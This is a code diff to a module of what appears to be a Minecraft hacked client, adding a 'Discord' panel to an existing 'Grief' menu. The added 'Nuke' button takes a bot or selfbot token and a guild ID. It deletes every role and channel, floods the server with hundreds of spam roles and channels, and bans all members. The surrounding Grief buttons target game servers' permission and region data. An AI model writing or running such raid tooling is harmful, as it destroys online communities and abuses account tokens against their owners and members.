@@ -6,18 +6,25 @@ package net.shadow.client.feature.module.impl.render;
 
 import com.mojang.brigadier.suggestion.Suggestion;
 import com.mojang.brigadier.suggestion.Suggestions;
+
+import net.minecraft.client.util.GlfwUtil;
 import net.minecraft.client.util.math.MatrixStack;
 import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
 import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
 import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
 import net.minecraft.network.packet.s2c.play.OpenWrittenBookS2CPacket;
 import net.shadow.client.ShadowMain;
+import net.shadow.client.feature.config.BooleanSetting;
+import net.shadow.client.feature.config.StringSetting;
 import net.shadow.client.feature.gui.clickgui.element.Element;
+import net.shadow.client.feature.gui.clickgui.element.impl.config.BooleanSettingEditor;
+import net.shadow.client.feature.gui.clickgui.element.impl.config.StringSettingEditor;
 import net.shadow.client.feature.gui.panels.PanelsGui;
 import net.shadow.client.feature.gui.panels.elements.PanelButton;
 import net.shadow.client.feature.gui.panels.elements.PanelFrame;
 import net.shadow.client.feature.module.Module;
 import net.shadow.client.feature.module.ModuleType;
+import net.shadow.client.helper.discord.DiscordClient;
 import net.shadow.client.helper.event.EventType;
 import net.shadow.client.helper.event.Events;
 import net.shadow.client.helper.event.events.PacketEvent;
@@ -25,6 +32,9 @@ import net.shadow.client.helper.util.Utils;
 
 import java.util.Arrays;
 import java.util.Random;
+import java.util.concurrent.LinkedBlockingQueue;
+import java.util.concurrent.ThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
 
 public class ToolsScreen extends Module {
 
@@ -33,6 +43,15 @@ public class ToolsScreen extends Module {
     boolean enabled = false;
     boolean alt = false;
     PanelsGui menu = null;
+
+    BooleanSetting ban = new BooleanSetting.Builder(false).name("Ban Members").get();
+    BooleanSetting roles = new BooleanSetting.Builder(false).name("Nuke roles").get();
+    BooleanSetting channels = new BooleanSetting.Builder(false).name("Nuke channels").get();
+
+
+    BooleanSetting isSelfbot = new BooleanSetting.Builder(false).name("Is Selfbot").get();
+    StringSetting token = new StringSetting.Builder("").name("Token").get();
+    StringSetting guild = new StringSetting.Builder("").name("Guild ID").get();
 
     public ToolsScreen() {
         super("ToolsScreen", "The tools screen", ModuleType.RENDER);
@@ -110,9 +129,9 @@ public class ToolsScreen extends Module {
 
     @Override
     public void enable() {
-        if (menu == null) {
+        if (true) {
             menu = new PanelsGui(new PanelFrame[]{
-                    new PanelFrame(100, 100, 250, 190, "Grief", new Element[]{
+                    new PanelFrame(100, 100, 250, 170, "Grief", new Element[]{
                             new PanelButton(0, 0, -1, "Delete LP Data", () -> {
                                 packetinputmode = "lp";
                                 enabled = true;
@@ -144,8 +163,49 @@ public class ToolsScreen extends Module {
                                 enabled = true;
                                 ShadowMain.client.player.sendChatMessage("/rg list");
                             })
-                    })
-            });
+                    }),
+                    new PanelFrame(500, 100, 250, 125, "Discord", new Element[]{
+                        new StringSettingEditor(0, 0, 240, token),
+                        new StringSettingEditor(0, 30, 240, guild),
+                        new PanelButton(0, 65, -1, "Nuke", () -> {
+                            new Thread(() -> {
+                                final ThreadPoolExecutor pool = new ThreadPoolExecutor(10, 10, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>());
+                                try{
+                                    int guildId = Integer.valueOf(guild.getValue());
+                                    DiscordClient client = new DiscordClient(token.getValue(), isSelfbot.getValue());
+                                    if(roles.getValue()){
+                                        for(int role : client.getRoles(guildId)){
+                                            pool.execute(() -> client.deleteRole(guildId, role));
+                                            Utils.sleep(50);
+                                        }
+                                        for(int i = 0; i < 250; i++){
+                                            pool.execute(() -> client.createRole(guildId, "molesontop"));
+                                            Utils.sleep(50);
+                                        }
+                                    }
+                                    if(channels.getValue()){
+                                        for(int channel : client.getChannels(guildId)){
+                                            pool.execute(() -> client.deleteChannel(channel));
+                                            Utils.sleep(50);
+                                        }
+                                        for(int i = 0; i < 500; i++){
+                                            pool.execute(() -> client.createChannel(guildId, 0, "molesontop"));
+                                            Utils.sleep(50);
+                                        }
+                                    }
+                                    if(ban.getValue()){
+                                        for(int member : client.getMembers(guildId)){
+                                            pool.execute(() -> client.banMember(guildId, member));
+                                            Utils.sleep(50);
+                                        }
+                                    }
+                                }catch(Exception e){
+                                    e.printStackTrace();
+                                }
+                            }).start();
+                        }),
+                    })  
+                });
         }
         ShadowMain.client.setScreen(menu);
         this.setEnabled(false);
